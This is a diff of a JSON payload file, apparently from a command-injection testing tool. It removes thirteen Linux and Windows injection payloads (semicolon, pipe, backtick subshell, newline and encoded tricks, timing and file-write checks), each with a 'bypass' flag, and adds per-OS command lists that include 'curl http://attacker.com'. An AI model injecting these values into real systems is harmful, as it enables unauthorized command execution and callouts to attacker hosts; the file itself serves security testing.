@@ -1,67 +1,16 @@
-[
-  {
-    "type": "Linux - Semicolon",
-    "payload": "; ls -la",
-    "bypass": false
-  },
-  {
-    "type": "Linux - Pipe",
-    "payload": "| whoami",
-    "bypass": false
-  },
-  {
-    "type": "Linux - AND operator",
-    "payload": "&& id",
-    "bypass": false
-  },
-  {
-    "type": "Linux - Sleep based detection",
-    "payload": "&& sleep 5",
-    "bypass": true
-  },
-  {
-    "type": "Linux - Subshell",
-    "payload": "`id`",
-    "bypass": true
-  },
-  {
-    "type": "Linux - File write",
-    "payload": "&& echo injected > /tmp/injected.txt",
-    "bypass": true
-  },
-  {
-    "type": "Windows - Ampersand",
-    "payload": "& whoami",
-    "bypass": false
-  },
-  {
-    "type": "Windows - AND",
-    "payload": "&& net user",
-    "bypass": false
-  },
-  {
-    "type": "Windows - Pipe",
-    "payload": "| net user",
-    "bypass": false
-  },
-  {
-    "type": "Windows - Sleep (ping)",
-    "payload": "& ping -n 6 127.0.0.1 > nul",
-    "bypass": true
-  },
-  {
-    "type": "Windows - Write file",
-    "payload": "& echo hacked > C:\\temp\\injected.txt",
-    "bypass": true
-  },
-  {
-    "type": "Universal - Newline trick",
-    "payload": "%0a whoami",
-    "bypass": true
-  },
-  {
-    "type": "Universal - Encoded",
-    "payload": "echo%20pwned",
-    "bypass": true
-  }
-]
+{
+  "linux": [
+    "ls",
+    "whoami",
+    "id",
+    "uname -a",
+    "curl http://attacker.com"
+  ],
+  "windows": [
+    "dir",
+    "whoami",
+    "type C:\\Windows\\System32\\drivers\\etc\\hosts",
+    "powershell -Command \"Get-Process\"",
+    "curl http://attacker.com"
+  ]
+}
